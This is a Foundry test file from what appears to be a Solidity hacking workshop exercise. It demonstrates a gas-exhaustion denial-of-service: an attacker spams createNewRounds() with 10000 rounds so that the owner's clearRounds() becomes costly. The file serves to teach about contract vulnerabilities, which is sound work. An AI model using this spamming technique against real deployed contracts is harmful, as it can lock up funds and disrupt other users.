// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Counter.sol";
import {WinnerTakesAll} from "../src/SolidityHackingWorkshopV8.sol";

contract Exercise15_WinnerTakeAll is Test {
    WinnerTakesAll public game;
    address public owner = vm.addr(1);

    /**
     * Attacker could spam the createNewRounds() and increase
     * the gas cost on clearRounds() while create a DoS attack
     */
    function setUp() public {
        vm.startPrank(owner);
        game = new WinnerTakesAll();
        vm.stopPrank();
    }

    function test_clearRounds() public {
        game.createNewRounds(3);

        // deleting 3 rounds only
        vm.startPrank(owner);
        game.clearRounds();
        vm.stopPrank();

        // attacker spam
        game.createNewRounds(10000);

        // deleting 10000 rounds
        vm.startPrank(owner);
        game.clearRounds();
        vm.stopPrank();
    }
}
